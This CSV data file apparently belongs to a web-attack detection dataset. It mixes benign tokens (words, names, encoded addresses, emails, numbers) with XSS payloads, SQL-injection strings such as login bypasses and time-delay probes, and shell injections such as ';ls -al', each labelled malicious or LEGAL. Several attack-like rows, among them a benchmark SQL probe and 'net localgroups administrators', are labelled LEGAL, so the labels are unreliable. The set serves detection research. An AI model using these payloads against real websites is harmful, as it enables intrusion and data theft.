index,payload,is_malicious,injection_type
4215,beatable,0.0,LEGAL
4216,940,0.0,LEGAL
4217,9358789607816235,0.0,LEGAL
4218,m_at1i852se,0.0,LEGAL
4219,gleams,0.0,LEGAL
4220,a*6EMOLaR,0.0,LEGAL
4221,Ghislaine,0.0,LEGAL
4222,Antonietta,0.0,LEGAL
4223,baryshnikov%40lola-lutscht.es,0.0,LEGAL
4224,blindfolding,0.0,LEGAL
4225,"'><A HREF=""//google"">X</A>",1.0,XSS
4226,uprightness,0.0,LEGAL
4227,Gassol,0.0,LEGAL
4228,3448589549551103,0.0,LEGAL
4229,gaming,0.0,LEGAL
4230,churches,0.0,LEGAL
4231,5915670092186010,0.0,LEGAL
4232,photodiodes,0.0,LEGAL
4233,Arianist,0.0,LEGAL
4234,existent,0.0,LEGAL
4235,instrumenting,0.0,LEGAL
4236,maid,0.0,LEGAL
4237,reminded,0.0,LEGAL
4238,Shaib,0.0,LEGAL
4239,Addi,0.0,LEGAL
4240,Duke,0.0,LEGAL
4241,muttered,0.0,LEGAL
4242,sprayed,0.0,LEGAL
4243,Jacquetta,0.0,LEGAL
4244,findley,0.0,LEGAL
4245,"a=""get"";b=""URL(\"""";c=""javascript:"";d=""alert(1);\"")"";eval(a+b+c+d);",1.0,XSS
4246,bristle,0.0,LEGAL
4247,interleaving,0.0,LEGAL
4248,colleen,0.0,LEGAL
4249,stainbac,0.0,LEGAL
4250,unrest,0.0,LEGAL
4251,84,0.0,LEGAL
4252,Toros+De+Guisando+53+4-G,0.0,LEGAL
4253,brethren,0.0,LEGAL
4254,"""+onkeypress=""prompt(23)""+",1.0,XSS
4255,3958760968,0.0,LEGAL
4256,faun,0.0,LEGAL
4257,ailee1,0.0,LEGAL
4258,paginated,0.0,LEGAL
4259,Kris,0.0,LEGAL
4260,Cabezon+Huguet,0.0,LEGAL
4261,succeed,0.0,LEGAL
4262,kava_ivic%40comercioenlacalle.info,0.0,LEGAL
4263,85640413M,0.0,LEGAL
4264,2776,0.0,LEGAL
4265,louis,0.0,LEGAL
4266,Cill%E1n,0.0,LEGAL
4267,elusively,0.0,LEGAL
4268,\\../\\../\\../file',1.0,SHELL
4269,Shanta,0.0,LEGAL
4270,Chucena,0.0,LEGAL
4271,"""><svg/onload=t=/aler/.source+/t/.source;window.onerror=window[t];throw+1;//",1.0,XSS
4272,0a31e7a4,0.0,LEGAL
4273,captaining,0.0,LEGAL
4274,Yvone,0.0,LEGAL
4275,"(6105-benchmark(1,0x53454c454354204e554c4c)+44498)",0.0,LEGAL
4276,978,0.0,LEGAL
4277,Marcel,0.0,LEGAL
4278,03020287L,0.0,LEGAL
4279,stake,0.0,LEGAL
4280,17483049043137063800,0.0,LEGAL
4281,Juli,0.0,LEGAL
4282,sleep 9 #,0.0,LEGAL
4283,anesthetic,0.0,LEGAL
4284,http%3A%2F%2Fwww.atwoodknives.blogspot.com%2F,0.0,LEGAL
4285,05196917K,0.0,LEGAL
4286,harmonics,0.0,LEGAL
4287,50619,0.0,LEGAL
4288,edge,0.0,LEGAL
4289,du-tuan,0.0,LEGAL
4290,Cami%F1o+Da+Via+S%2FN%2C+,0.0,LEGAL
4291,tacking,0.0,LEGAL
4292,raindrop,0.0,LEGAL
4293,"<base href=""javascript:\""> <a href=""//%0a%0dconfirm(2);//"">XSS</a>",1.0,XSS
4294,Kalanit,0.0,LEGAL
4295,esquires,0.0,LEGAL
4296,pith,0.0,LEGAL
4297,"<img src=""http://127.0.0.1:3555/xss_serve_payloads/gif.gif"" onerror=alert(1)>",1.0,XSS
4298,"&lt;IMG SRC=\""javascript&#058;alert('XSS');\""&gt;",1.0,XSS
4299,parametric,0.0,LEGAL
4300,Lydie,0.0,LEGAL
4301,O'Connell,0.0,LEGAL
4302,soothes,0.0,LEGAL
4303,digitization,0.0,LEGAL
4304,dissipates,0.0,LEGAL
4305,Comandante+Barja+84%2C+,0.0,LEGAL
4306,safeguards,0.0,LEGAL
4307,Morna,0.0,LEGAL
4308,Partha,0.0,LEGAL
4309,"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--",1.0,SQL
4310,07698521F,0.0,LEGAL
4311,32760704X,0.0,LEGAL
4312,chopped,0.0,LEGAL
4313,pistil,0.0,LEGAL
4314,heterosexual,0.0,LEGAL
4315,AGiWqtx-oS3ZXE70g-Hmn9VT6BJ9BzF45w,0.0,LEGAL
4316,}*{color:#ccc;},1.0,XSS
4317,Bantus,0.0,LEGAL
4318,81192846V,0.0,LEGAL
4319,Moses,0.0,LEGAL
4320,alop%E1TiCA,0.0,LEGAL
4321,delusion,0.0,LEGAL
4322,9040,0.0,LEGAL
4323,' or '1'='1,1.0,SQL
4324,Oleg,0.0,LEGAL
4325,Aphrodite,0.0,LEGAL
4326,33969414R,0.0,LEGAL
4327,Convento+De+Las+Due%F1as+86+,0.0,LEGAL
4328,runner,0.0,LEGAL
4329,http%3A%2F%2Fad.doubleclick.net%2Fadi%2Fx1.gcn%2Fhp%2Fron%3Bsz%3D300x250%3Bclick%3Dhttp%3A%2F%2Fgoogleads.g.doubleclick.net%2Faclk%3Fsa%3Dl%26ai%3DBdljntLQGS-2pG-PilQfr8_HxDoiI3YEB7Ob4kBDE54rbFwAQARgCIP_P-wE4AFCAx-HEBGDJ,0.0,LEGAL
4330,multiplications,0.0,LEGAL
4331,ru0ian5e,0.0,LEGAL
4332,absorbency,0.0,LEGAL
4333,allotment,0.0,LEGAL
4334,tails,0.0,LEGAL
4335,a085628O,0.0,LEGAL
4336,39593,0.0,LEGAL
4337,zhongguo,0.0,LEGAL
4338,admin') or '1'='1,1.0,SQL
4339,everyday,0.0,LEGAL
4340,Algenib,0.0,LEGAL
4341,Carrocera,0.0,LEGAL
4342,9269450355652252,0.0,LEGAL
4343,43817,0.0,LEGAL
4344,a=/ev/// .source a+=/al/// .source a[a] (name),1.0,XSS
4345,45221,0.0,LEGAL
4346,<b/%25%32%35%25%33%36%25%36%36%25%32%35%25%33%36%25%36%35mouseover=alert(1)>,1.0,XSS
4347,50369,0.0,LEGAL
4348,arranged,0.0,LEGAL
4349,122,0.0,LEGAL
4350,affects,0.0,LEGAL
4351,cylinders,0.0,LEGAL
4352,en%26btnG,0.0,LEGAL
4353,"""><script crossorigin>alert(1);</script>",1.0,XSS
4354,enALtEceDOr,0.0,LEGAL
4355,3243,0.0,LEGAL
4356,pitilessly,0.0,LEGAL
4357,whimpers,0.0,LEGAL
4358,97228883V,0.0,LEGAL
4359,Nicoli,0.0,LEGAL
4360,Calixta,0.0,LEGAL
4361,5690251194310555,0.0,LEGAL
4362,;ls+-al;',1.0,SHELL
4363,Blanchard,0.0,LEGAL
4364,C%2F+Borgo%F1a+98%2C+13-D,0.0,LEGAL
4365,gleanings,0.0,LEGAL
4366,C%2F+Rio+Elorz+141+11-H,0.0,LEGAL
4367,descended,0.0,LEGAL
4368,49698,0.0,LEGAL
4369,tracers,0.0,LEGAL
4370,"<script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('alert(1)')()</script>",1.0,XSS
4371,35697894P,0.0,LEGAL
4372,Yoke,0.0,LEGAL
4373,Calle+Valencia+160+1-F,0.0,LEGAL
4374,imperfect,0.0,LEGAL
4375,paladial,0.0,LEGAL
4376,quarry,0.0,LEGAL
4377,hogu1ra,0.0,LEGAL
4378,destined,0.0,LEGAL
4379,Calle+San+Lazaro%2C+82+8B,0.0,LEGAL
4380,1331908736,0.0,LEGAL
4381,http%3A%2F%2Fwww.healingdaily.com%2Fdetoxification-diet%2Folive-oil.htm,0.0,LEGAL
4382,de38,0.0,LEGAL
4383,carriages,0.0,LEGAL
4384,8321,0.0,LEGAL
4385,turned,0.0,LEGAL
4386,costriNGir,0.0,LEGAL
4387,falcon,0.0,LEGAL
4388,wwwboard,0.0,LEGAL
4389,nessus-1332010196,0.0,LEGAL
4390,Manimozhi,0.0,LEGAL
4391,trimly,0.0,LEGAL
4392,Nicodemo,0.0,LEGAL
4393,C%E1diz,0.0,LEGAL
4394,jenson.vikulin%40sehimaco.um,0.0,LEGAL
4395,surround,0.0,LEGAL
4396,darwin,0.0,LEGAL
4397,London,0.0,LEGAL
4398,Llosa+de+Ranes%2C+la,0.0,LEGAL
4399,">""<STYLE>li {list-style-image: url(""javascript:document.cookie=true;"");</STYLE><UL><LI>CrossSiteScripting",1.0,XSS
4400,A%EDnsa-Sobrarbe,0.0,LEGAL
4401,&h=4&z=350&al='><script>alert(1234)</script>&st=y,1.0,XSS
4402,Ullastrell,0.0,LEGAL
4403,&page=servicefaq&geo='-location.replace('//1653309246')-'&product=ipad,1.0,XSS
4404,overtakers,0.0,LEGAL
4405,Plaza+De+La+Constitucion+40%2C+5E,0.0,LEGAL
4406,Irigoyen+Bombard%F3,0.0,LEGAL
4407,outright,0.0,LEGAL
4408,gribbon%40engibraltar.to,0.0,LEGAL
4409,finucane,0.0,LEGAL
4410,1317,0.0,LEGAL
4411,Costas,0.0,LEGAL
4412,chalifou,0.0,LEGAL
4413,29620,0.0,LEGAL
4414,seahorse,0.0,LEGAL
4415,titulars,0.0,LEGAL
4416,birches,0.0,LEGAL
4417,schwarz,0.0,LEGAL
4418,Cruft+1100-1607,0.0,LEGAL
4419,Consuela,0.0,LEGAL
4420,Aldebaran+84%2C+,0.0,LEGAL
4421,Baixada+Can+Llobet+124%2C+,0.0,LEGAL
4422,predefine,0.0,LEGAL
4423,summations,0.0,LEGAL
4424,monocular,0.0,LEGAL
4425,spatter,0.0,LEGAL
4426,rifles,0.0,LEGAL
4427,""",NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1.0,SQL
4428,indeterminacies,0.0,LEGAL
4429,"a=""get"";b=""URL(ja\"""";c=""vascr"";d=""ipt:ale"";e=""rt('XSS');\"")"";eval(a+b+c+d+e);",1.0,XSS
4430,9827774272477176,0.0,LEGAL
4431,net localgroups administrators,0.0,LEGAL
4432,48435837E,0.0,LEGAL
4433,glassed,0.0,LEGAL
4434,2546840770409858,0.0,LEGAL
4435,glitter,0.0,LEGAL
4436,"&lt;A HREF=\""http&#58;//66&#46;102&#46;7&#46;147/\""&gt;XSS&lt;/A&gt;",1.0,XSS
4437,dewy,0.0,LEGAL
4438,Callejon+Tallacarne+175%2C+6%3FC,0.0,LEGAL
4439,gig,0.0,LEGAL
4440,1235174649,0.0,LEGAL
4441,baskeT,0.0,LEGAL
4442,"<!--#echo var=""document_uri"" -->",1.0,XSS
4443,mc_28832_523,0.0,LEGAL
4444,3144979432613854,0.0,LEGAL
4445,friebus%40tintaultravioleta.cc,0.0,LEGAL
4446,Lapoblaci%F3n,0.0,LEGAL
4447,Maureen,0.0,LEGAL
4448,"<!--#echo var=""http_user_agent"" -->",1.0,XSS
4449,Grau,0.0,LEGAL
4450,Shari,0.0,LEGAL
4451,amalee,0.0,LEGAL
4452,Asad,0.0,LEGAL
4453,<script>var location={};</script>,1.0,XSS
4454,magnin_arne%40tiebreak.com.sr,0.0,LEGAL
4455,penetrating,0.0,LEGAL
4456,Esparreguera,0.0,LEGAL
4457,Ortigueira,0.0,LEGAL
4458,3212381335432418,0.0,LEGAL
4459,Gilligan,0.0,LEGAL
4460,Richards,0.0,LEGAL
4461,+onerror=prompt(1)%3E/,1.0,XSS
4462,65927228M,0.0,LEGAL
4463,24596413Y,0.0,LEGAL
4464,Carrafa+Doral,0.0,LEGAL
4465,riotous,0.0,LEGAL
4466,05022335814689304051,0.0,LEGAL
4467,38355013Y,0.0,LEGAL
4468,33727049X,0.0,LEGAL
4469,Nuvit,0.0,LEGAL
4470,lobe,0.0,LEGAL
4471,jusmeter-se,0.0,LEGAL
4472,Bartlett,0.0,LEGAL
4473,admin' #,1.0,SQL
4474,severely,0.0,LEGAL
4475,takahash,0.0,LEGAL
4476,reinterprets,0.0,LEGAL
4477,similarity,0.0,LEGAL
4478,javascript:c=String.fromCharCode;alert(c(83)+c(117)+c(109)+c(79)+c(102)+c(80)+c(119)+c(110)+c(46)+c(110)+c(108)),1.0,XSS
4479,tena,0.0,LEGAL
4480,dismembered,0.0,LEGAL
4481,Calle+Batalla+De+Otumba+26%2C+,0.0,LEGAL
4482,busing,0.0,LEGAL
4483,recruit,0.0,LEGAL
4484,def0n470n,0.0,LEGAL
4485,8671,0.0,LEGAL
4486,Calle+Hospital%2C+68+,0.0,LEGAL
4487,ru-utf-8,0.0,LEGAL
4488,conquerable,0.0,LEGAL
4489,murmured,0.0,LEGAL
4490,mantissas,0.0,LEGAL
4491,Lli%E7%E0+de+Vall,0.0,LEGAL
4492,furrier,0.0,LEGAL
4493,04877,0.0,LEGAL
4494,dividers,0.0,LEGAL
4495,' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(table_name)) FROM sys.all_tables)) AND 'i'='i,1.0,SQL
4496,33372246M,0.0,LEGAL
4497,bekki,0.0,LEGAL
4498,Gelya,0.0,LEGAL
4499,1258818287,0.0,LEGAL
4500,6343513594517926,0.0,LEGAL
4501,movement,0.0,LEGAL
4502,Cohn,0.0,LEGAL
4503,"&';}},{scope:'email,user_about_me,user_hometown,user_interests,user_likes,user_status,user_website,user_birthday,publish_stream,publish_actions,offline_access'});}alert(0);b=function(response){c=({a:{//",1.0,XSS
4504,18121520G,0.0,LEGAL
4505,BrUScamente,0.0,LEGAL
4506,vincent,0.0,LEGAL
4507,undivided,0.0,LEGAL
4508,dedication,0.0,LEGAL
4509,animate,0.0,LEGAL
4510,postmortem,0.0,LEGAL
4511,33402,0.0,LEGAL
4512,emlynne,0.0,LEGAL
4513,19120,0.0,LEGAL
4514,6183,0.0,LEGAL
4515,curtly,0.0,LEGAL
4516,distributional,0.0,LEGAL
4517,bigotry,0.0,LEGAL
4518,rerouted,0.0,LEGAL
4519,fisicoqu%EDmico,0.0,LEGAL
4520,08430,0.0,LEGAL
4521,2265397285220921,0.0,LEGAL
4522,Canciller+Aiguad%E9,0.0,LEGAL
4523,Lowe,0.0,LEGAL
4524,"<IMG%20SRC=""jav&#x09;ascript:alert('WXSS');"">",1.0,XSS
4525,Sierra+de+Luna,0.0,LEGAL
4526,instigator,0.0,LEGAL
4527,elephant,0.0,LEGAL
4528,Tyronda,0.0,LEGAL
4529,diet,0.0,LEGAL
4530,riverfront,0.0,LEGAL
4531,\x0asleep 9 #,0.0,LEGAL
4532,memorially,0.0,LEGAL
4533,2282507276163108,0.0,LEGAL
4534,espantalcon%40necesitocurro.sh,0.0,LEGAL
4535,boisvert,0.0,LEGAL
4536,Fields,0.0,LEGAL
4537,Aggy,0.0,LEGAL
4538,3055509843252102,0.0,LEGAL
4539,"admin"") or ""1""=""1",1.0,SQL
4540,05906736Z,0.0,LEGAL
4541,links,0.0,LEGAL
4542,despault2,0.0,LEGAL
4543,plucked,0.0,LEGAL
4544,flushed,0.0,LEGAL
4545,Walbridge,0.0,LEGAL
4546,ponies,0.0,LEGAL
4547,phelpr%40eonon.com.pr,0.0,LEGAL
4548,Niall,0.0,LEGAL
4549,cutlass,0.0,LEGAL
4550,Eryn,0.0,LEGAL
4551,marketed,0.0,LEGAL
4552,microprogrammer,0.0,LEGAL
4553,p9a1A,0.0,LEGAL
4554,Doreen,0.0,LEGAL
4555,Urkiaga,0.0,LEGAL
4556,seeming,0.0,LEGAL
4557,mastered,0.0,LEGAL
4558,b99e4ic5ino,0.0,LEGAL
4559,krzyski-wieman%40hiperzaragoza.er,0.0,LEGAL
4560,postscript,0.0,LEGAL
4561,taxonomy,0.0,LEGAL
4562,seasoner,0.0,LEGAL
4563,'><scr<script>ipt>alert(1)</scr</script>ipt>,1.0,XSS
4564,34064602S,0.0,LEGAL
4565,09133,0.0,LEGAL
4566,Kafkaesque,0.0,LEGAL
4567,aguilar,0.0,LEGAL
4568,effect,0.0,LEGAL
4569,regi0ona2,0.0,LEGAL
4570,cuaderna,0.0,LEGAL
4571,dioxide,0.0,LEGAL
4572,Aicardo,0.0,LEGAL
4573,00907669411596173,0.0,LEGAL
4574,admin',1.0,SQL
4575,fraccIonaria,0.0,LEGAL
4576,berkelium,0.0,LEGAL
4577,Argonaut,0.0,LEGAL
4578,masts,0.0,LEGAL
4579,planoconvex,0.0,LEGAL
4580,Gudrun,0.0,LEGAL
4581,needlework,0.0,LEGAL
4582,reprover,0.0,LEGAL
4583,goldner,0.0,LEGAL
4584,Emmanuelle,0.0,LEGAL
4585,meeker_komorowska%40noviasteresapalacios.mx,0.0,LEGAL
4586,neighborhoods,0.0,LEGAL
4587,zoologically,0.0,LEGAL
4588,jonathan,0.0,LEGAL
4589,noname,0.0,LEGAL
4590,dullest,0.0,LEGAL
4591,http%3A%2F%2Fktroupe.blogspot.com%2F,0.0,LEGAL
4592,baroque,0.0,LEGAL
4593,inheritresses,0.0,LEGAL
4594,Carrer+Domenech+i+Montaner%2C+8+,0.0,LEGAL
4595,<body/onhashchange=alert(1)><a href=#>clickit,1.0,XSS
4596,a' and '456'='678,1.0,SQL
4597,C%2F+Sicilia%2C+162%2C+,0.0,LEGAL
4598,1915san0263.tif,0.0,LEGAL
4599,stronghold,0.0,LEGAL
4600,57i-9557a,0.0,LEGAL
4601,gastronome,0.0,LEGAL
4602,annals,0.0,LEGAL
4603,sxmfhrpifgmr7eceg,0.0,LEGAL
4604,bedridden,0.0,LEGAL
4605,dataz,0.0,LEGAL
4606,appertains,0.0,LEGAL
4607,fortify,0.0,LEGAL
4608,04644,0.0,LEGAL
4609,13emp0790c3ci%F34,0.0,LEGAL
4610,nagler%40multasdetransito.kg,0.0,LEGAL
4611,Hoefgen+1101-1603,0.0,LEGAL
4612,55031841V,0.0,LEGAL
4613,"'><img src=1 href=1 onerror=""javascript:alert(1)""></img>",1.0,XSS
4614,47831,0.0,LEGAL
4615,Astoria,0.0,LEGAL
4616,lord,0.0,LEGAL
4617,Gamarro,0.0,LEGAL
4618,deploys,0.0,LEGAL
4619,219702304,0.0,LEGAL
4620,canonicals,0.0,LEGAL
4621,strontium,0.0,LEGAL
4622,"<img\x11src=x onerror=""javascript:alert(1)"">",1.0,XSS
4623,Gordian,0.0,LEGAL
4624,Junie,0.0,LEGAL
4625,irregulars,0.0,LEGAL
4626,conflagration,0.0,LEGAL
4627,"<script\\x20type=""text/javascript"">javascript:alert(1);</script>",1.0,XSS
4628,hinkel,0.0,LEGAL
4629,truism,0.0,LEGAL
4630,clump,0.0,LEGAL
4631,h0mo0%EDs3ic2,0.0,LEGAL
4632,"&name=Search&action=search&overview=1&bool=AND&active_polling%0D%0Aweblinks=1&active_address_book=1&active_consultation=1&active_forum=1&active_requirements=1&active_calendar=1&active_guestbook=1&active_questionnaire=1&active_seminar=1&active_stories=1&active_downloads=1&active_users=1&active_subjects=1&q=1%22+onmouseover=alert%28String.fromCharCode%2872,101,108,108,111,32,87,111,114,108,100,33%29%29+&search=&search_area=all",1.0,XSS
4633,chivalrousness,0.0,LEGAL
4634,Jose+Maria+Mortes+Lerma%2C+151+11-D,0.0,LEGAL
4635,homan,0.0,LEGAL
4636,C%2F+Cornudella+Del+Montsant+142%2C+5%3FB,0.0,LEGAL
4637,Bellina,0.0,LEGAL
4638,best,0.0,LEGAL
4639,Islamization,0.0,LEGAL
4640,8267,0.0,LEGAL
4641,atrophies,0.0,LEGAL
4642,ventri.loquia,0.0,LEGAL
4643,mc_1117084_997,0.0,LEGAL
4644,quan%40arroyo-molinos.ee,0.0,LEGAL
4645,Emily,0.0,LEGAL
4646,cannisters,0.0,LEGAL
4647,clang,0.0,LEGAL
4648,nanosecond,0.0,LEGAL
4649,begley%40culturalsanpedrocf.lb,0.0,LEGAL
4650,Manijeh,0.0,LEGAL
4651,javascript&#x3A;alert&lpar;1&rpar;,1.0,XSS
4652,natures,0.0,LEGAL
4653,e2toc8da,0.0,LEGAL
4654,sail,0.0,LEGAL
4655,albarcoque,0.0,LEGAL
4656,naps,0.0,LEGAL
4657,3819M95U6A,0.0,LEGAL
4658,http%3A%2F%2Fsearchservice.myspace.com%2Findex.cfm%3Ffuseaction%3Dsitesearch.results%26orig%3Dsearch_Header%26origpfc%3DMusic%26type%3DMusic%26qry%3Drooftop%2Brhapsody%26submit%3DSearch,0.0,LEGAL
4659,deliberator,0.0,LEGAL
4660,Vitalia,0.0,LEGAL
4661,96600995Y,0.0,LEGAL
4662,wolski,0.0,LEGAL
4663,Wieslaw,0.0,LEGAL
4664,aspersions,0.0,LEGAL
4665,commuter,0.0,LEGAL
4666,stoning,0.0,LEGAL
4667,presente,0.0,LEGAL
4668,anesthetize,0.0,LEGAL
4669,Salamanca,0.0,LEGAL
4670,Deltebre,0.0,LEGAL
4671,elapses,0.0,LEGAL
4672,anz1%40hiperbilbao.fj,0.0,LEGAL
4673,pourer,0.0,LEGAL
4674,executing,0.0,LEGAL
4675,Ronica,0.0,LEGAL
4676,malenCO%3FN%EDA,0.0,LEGAL
4677,cannabis,0.0,LEGAL
4678,uplands,0.0,LEGAL
4679,<x ondblclick=alert(1)>double click this!,1.0,XSS
4680,Mula,0.0,LEGAL
4681,asparagus,0.0,LEGAL
4682,9795489618459865,0.0,LEGAL
4683,huong,0.0,LEGAL
4684,Piraeus,0.0,LEGAL
4685,buds,0.0,LEGAL
4686,Junior,0.0,LEGAL
4687,soon,0.0,LEGAL
4688,whereby,0.0,LEGAL
4689,Sevilla,0.0,LEGAL
4690,wwwstats,0.0,LEGAL
4691,hangar,0.0,LEGAL
4692,6357560742287401,0.0,LEGAL
4693,Thimbu,0.0,LEGAL
4694,rumored,0.0,LEGAL
4695,escribida,0.0,LEGAL
4696,situations,0.0,LEGAL
4697,compliant,0.0,LEGAL
4698,number9,0.0,LEGAL
4699,mosquito,0.0,LEGAL
4700,"></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",1.0,XSS
4701,' or sleep(__TIME__)#,1.0,SQL
4702,poet,0.0,LEGAL
4703,Gee,0.0,LEGAL
4704,03700,0.0,LEGAL
4705,revolver,0.0,LEGAL
4706,textiles,0.0,LEGAL
4707,8112463207764255,0.0,LEGAL
4708,29635485P,0.0,LEGAL
4709,1257806599306,0.0,LEGAL
4710,Twila,0.0,LEGAL
4711,41749,0.0,LEGAL
4712,Lugar+Cuartel+De+Los+Pinos+110%2C+5%3FC,0.0,LEGAL
4713,"&lt;META HTTP-EQUIV=""refresh"" CONTENT=""0;url=data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==""&gt;",1.0,XSS
4714,Meghann,0.0,LEGAL
4715,godly,0.0,LEGAL
4716,C%2F+Junco%2C+65%2C+,0.0,LEGAL
4717,53527134Q,0.0,LEGAL
4718,daisies,0.0,LEGAL
4719,",http%3A%2F%2Fus.ard.yahoo.com%2FSIG%3D15ohnr91q%2FM%3D715481.13522240.13596875.11172150%2FD%3Dmail%2FS%3D150550152%3ASKY%2F_ylt%3DApwe.qBeiTLKfTr2rOmYe_KINvkI%2FY%3DYAHOO%2FEXP%3D1257288795%2FL%3D6688ckWTYqoR26TCSvAo8AG5gU9KeErwmDsACB83%2FB%3DKmlSCESO5.4-%2FJ%3D1257281595541344%2FK%3DfwIHPXPTLoQ63AsXsg6kPw%2FA%3D5761139%2FR%3D0%2F%2A%24,http%3A%2F%2Fus.mg2.mail.yahoo.com%2Ffc%2Ffc%3Fp%3Dmail_candygram%26bg%3Dtransparent%26l%3Dsky%26f%3D150550152%26id%3D69%26cbk%3Dfcloaded%26tgt%3D_blank%26hs%3D2%26en%3Diso-8859-1%26em%3D%257b%2522site-attribute%2522%253a%2522content%253d%255,;ord",0.0,LEGAL
4720,&firstname=%22%3E%3Cscript%3Edocument.body.innerHTML%20%3D% 20%22%3Cblink%20style%3D'color%3A%20red%3B%20font-size%3A%2080px%3B'%3ELocked%20my%20ass!%3C% 2Fblink%3E%22%3B%3C/script%3E%3Cx,1.0,XSS
4721,<img src=x onerror=prompt(1)>,1.0,XSS
4722,EN3echAr,0.0,LEGAL
4723,D%E1maso,0.0,LEGAL
4724,tARDonA,0.0,LEGAL
4725,19180,0.0,LEGAL
4726,splice,0.0,LEGAL
4727,Mohammed,0.0,LEGAL
4728,A%F1adir+al+carrito,0.0,LEGAL
4729,chokmorov%40biopoint.rs,0.0,LEGAL
4730,gre%D1a,0.0,LEGAL
4731,http%3A%2F%2Frattlernation.blogspot.com%2F2009%2F03%2Ffamu-teams-with-apalachee-center-for.html,0.0,LEGAL
4732,junctions,0.0,LEGAL
4733,illustrators,0.0,LEGAL
4734,knicks,0.0,LEGAL
4735,"<script>x=""""?prompt(9):"""";y=42;</script>",1.0,XSS
4736,Itero+de+la+Vega,0.0,LEGAL
4737,snorting,0.0,LEGAL
4738,loturak,0.0,LEGAL
4739,committeemen,0.0,LEGAL
4740,Harmonist,0.0,LEGAL
4741,roasts,0.0,LEGAL
4742,redresses,0.0,LEGAL
4743,5170755929650123,0.0,LEGAL
4744,"""</script><svg><script>alert(1)+&quot;"";",1.0,XSS
4745,catalogos,0.0,LEGAL
4746,are,0.0,LEGAL
4747,Novoa+Robert,0.0,LEGAL
4748,Christie,0.0,LEGAL
4749,22240,0.0,LEGAL
4750,5010239039500550,0.0,LEGAL
4751,racette,0.0,LEGAL
4752,tarpey%40bwds.ne,0.0,LEGAL
4753,Kantian,0.0,LEGAL
4754,Juan,0.0,LEGAL
4755,grelck,0.0,LEGAL
4756,Calle+Chozo+S%2FN+7-D,0.0,LEGAL
4757,bleak,0.0,LEGAL
4758,<iframe src=x onerror=prompt(1)>,1.0,XSS
4759,"`""'><img src=xxx:x \x0Aonerror=javascript:alert(1)>",1.0,XSS
4760,<body onactivate=alert(1)>,1.0,XSS
4761,argumentation,0.0,LEGAL
4762,0837757133124277,0.0,LEGAL
4763,stiles,0.0,LEGAL
4764,Huck,0.0,LEGAL
4765,23456317C,0.0,LEGAL
4766,pillory,0.0,LEGAL
4767,del\xa0q87867783,0.0,LEGAL
4768,Vaticanize,0.0,LEGAL
4769,illusive,0.0,LEGAL
4770,17334975644032033548,0.0,LEGAL
4771,Mohd,0.0,LEGAL
4772,absolution,0.0,LEGAL
4773,centrally,0.0,LEGAL
4774,llamadas,0.0,LEGAL
4775,r57ipb216_for_ids,0.0,LEGAL
4776,bisques,0.0,LEGAL
4777,inscriptions,0.0,LEGAL
4778,pander,0.0,LEGAL
4779,M%E1ximo,0.0,LEGAL
4780,C%2F+Pintor+Murillo%2C+23%2C+8%3FB,0.0,LEGAL
4781,amoeba,0.0,LEGAL
4782,7434846807193108,0.0,LEGAL
4783,dogging,0.0,LEGAL
4784,4102716313272060,0.0,LEGAL
4785,Lindstrom,0.0,LEGAL
4786,%C0%BCscript%C0%BEalert(1)%C0%BC/script%C0%BE,1.0,XSS
4787,acquires,0.0,LEGAL
4788,"'><isindex action=""javascript:alert(1)"" type=image>",1.0,XSS
4789,kussauer_brereton%40showcarsmadrid.com.kp,0.0,LEGAL
4790,Meryl,0.0,LEGAL
4791,plommer8%40artesania.org.sj,0.0,LEGAL
4792,duties,0.0,LEGAL
4793,eprojects,0.0,LEGAL
4794,hoppe%40joyaseleccion.pe,0.0,LEGAL
4795,Calle+Del+Mistral%2C+65+,0.0,LEGAL
4796,Bethanne,0.0,LEGAL
4797,"<EMBED SRC=""http://vulnerability-lab.com/CrossSiteScripting.swf"" AllowScriptAccess=""always""></EMBED>",1.0,XSS
4798,<h1><font color=blue>hellox worldss</h1>,1.0,XSS
4799,Escudero+Ostria,0.0,LEGAL
4800,acknowledge,0.0,LEGAL
4801,h9drog4%E10i9a,0.0,LEGAL
4802,Ursula,0.0,LEGAL
4803,r1m2samente,0.0,LEGAL
4804,C%2F+Virgen+Del+Pilar%2C+138%2C+,0.0,LEGAL
4805,ekes,0.0,LEGAL
